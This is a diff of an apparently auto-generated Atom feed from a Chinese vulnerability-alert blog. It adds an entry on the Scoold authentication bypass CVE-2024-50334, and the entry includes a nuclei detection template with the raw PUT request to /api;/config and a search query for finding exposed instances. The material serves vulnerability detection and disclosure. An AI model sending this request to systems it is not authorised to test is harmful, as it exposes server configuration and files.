@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-05T02:34:36.384Z</updated>
+  <updated>2025-07-05T02:45:20.219Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Scoold 认证绕过漏洞</title>
+    <link href="http://example.com/2025/07/05/github_973203964/"/>
+    <id>http://example.com/2025/07/05/github_973203964/</id>
+    <published>2025-07-05T02:45:20.000Z</published>
+    <updated>2025-07-05T02:45:20.219Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Scoold 认证绕过漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-50334</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> Scoold是一个为团队设计的问答和知识共享平台，广泛应用于企业内部的知识管理和团队协作场景。该平台允许用户提问、回答问题以及共享知识，支持多种部署方式，包括云服务和本地部署。由于其便捷的功能和易用性，Scoold在多个行业和组织中得到广泛应用。该漏洞存在于Scoold平台的&#x2F;api;&#x2F;config端点，攻击者通过在URL中追加分号，可以绕过认证机制，未经授权访问敏感的配置数据。此外，通过向&#x2F;api;&#x2F;config端点发送PUT请求，并设置Content-Type为application&#x2F;hocon，攻击者可以利用HOCON文件包含漏洞读取服务器上的文件。这一漏洞的技术根源在于输入验证不充分，导致攻击者能够构造特殊的请求绕过认证和访问控制。利用此漏洞，攻击者可以获取服务器上的敏感信息，如配置文件，这些信息可能被用于进一步的攻击。此漏洞的影响范围包括信息泄露和潜在的进一步系统入侵，攻击无需认证即可远程执行，且可以自动化利用。Scoold 1.64.0版本已修复此漏洞，临时解决方案可通过设置scoold.api_enabled &#x3D; false禁用Scoold API来缓解风险。</p><p><strong>产品厂商：</strong> erudika</p><p><strong>产品名称：</strong> Scoold</p><p><strong>影响版本：</strong> &lt; 1.64.0</p><p><strong>搜索语法：</strong> html:”scoold-wrapper”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/c23fb5579a5c6d46c95f305b6ec19abe281e4920/http%2Fcves%2F2024%2FCVE-2024-50334.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/c23fb5579a5c6d46c95f305b6ec19abe281e4920/http%2Fcves%2F2024%2FCVE-2024-50334.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">50334</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Scoold <span class="hljs-operator">&lt;</span> <span class="hljs-number">1.64</span>.<span class="hljs-number">0</span> <span class="hljs-operator">-</span> Authentication Bypass<br>  <span class="hljs-params">author:</span> xbow,iamnoooob,pdresearch<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    Scoold is a Q&amp;A and a knowledge sharing platform for teams. A semicolon path injection vulnerability was found on the <span class="hljs-symbol">/api</span>;<span class="hljs-symbol">/config</span> endpoint. By appending a semicolon <span class="hljs-keyword">in</span> the URL, attackers can bypass authentication and gain unauthorised access to sensitive configuration data. Furthermore, PUT requests on the <span class="hljs-symbol">/api</span>;<span class="hljs-symbol">/config</span> endpoint while setting the Content-Type- application<span class="hljs-symbol">/hocon</span> header allow unauthenticated attackers to file reading via HOCON file inclusion. This allows attackers to retrieve sensitive information such as configuration files from the server, which can be leveraged for further exploitation. The vulnerability has been fixed <span class="hljs-keyword">in</span> Scoold <span class="hljs-number">1.64</span>.<span class="hljs-number">0</span>. A workaround would be to disable the Scoold API <span class="hljs-keyword">with</span> scoold.api_enabled <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>xbow.com<span class="hljs-operator">/</span>blog<span class="hljs-operator">/</span>xbow-scoold-vuln<span class="hljs-symbol">/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2024-50334</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/Erudika/scoold/releases/tag/1.64.0</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:L<span class="hljs-operator">/</span>I:N<span class="hljs-operator">/</span>A:N<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">5.3</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">50334</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">288</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.00118</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.31616</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:erudika:scoold:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">vendor:</span> erudika<br>    <span class="hljs-params">product:</span> scoold<br>    <span class="hljs-params">shodan-query:</span> html:<span class="hljs-string">&quot;scoold-wrapper&quot;</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>  <span class="hljs-params">tags:</span> cve,cve2024,scoold,info-leak,erudika,auth-bypass<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        PUT <span class="hljs-symbol">/api</span>;<span class="hljs-symbol">/config</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/hocon</span><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;contains(body, <span class="hljs-string">&quot;scoold.app_name&quot;</span>)&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains(content_type,<span class="hljs-string">&quot;application/json&quot;</span>)&#x27;<br>          <span class="hljs-operator">-</span> &#x27;status_code<span class="hljs-operator">==</span><span class="hljs-number">200</span>&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Scoold 认证绕过漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/str</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
   
   <entry>
     <title>中科博华网龙网关 arp_scanphp 任意文件读取漏洞</title>
@@ -502,32 +529,6 @@
     
     
     <category term="VulmonFeeds" scheme="http://example.com/tags/VulmonFeeds/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>transilienceai Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_918099318/"/>
-    <id>http://example.com/2025/07/05/twitter_918099318/</id>
-    <published>2025-07-05T01:00:43.000Z</published>
-    <updated>2025-07-05T01:00:43.463Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> transilienceai</p><p><strong>推文：</strong> 被积极利用的CVE漏洞：CVE-2025-20309</p><p><strong>链接：</strong> <a href="https://x.com/transilienceai/status/1941291178881597920">https://x.com/transilienceai/status/1941291178881597920</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; transilienceai&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 被积极利用的CVE漏洞：CVE-2025-20309&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://x</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="transilienceai" scheme="http://example.com/tags/transilienceai/"/>
     
   </entry>
   
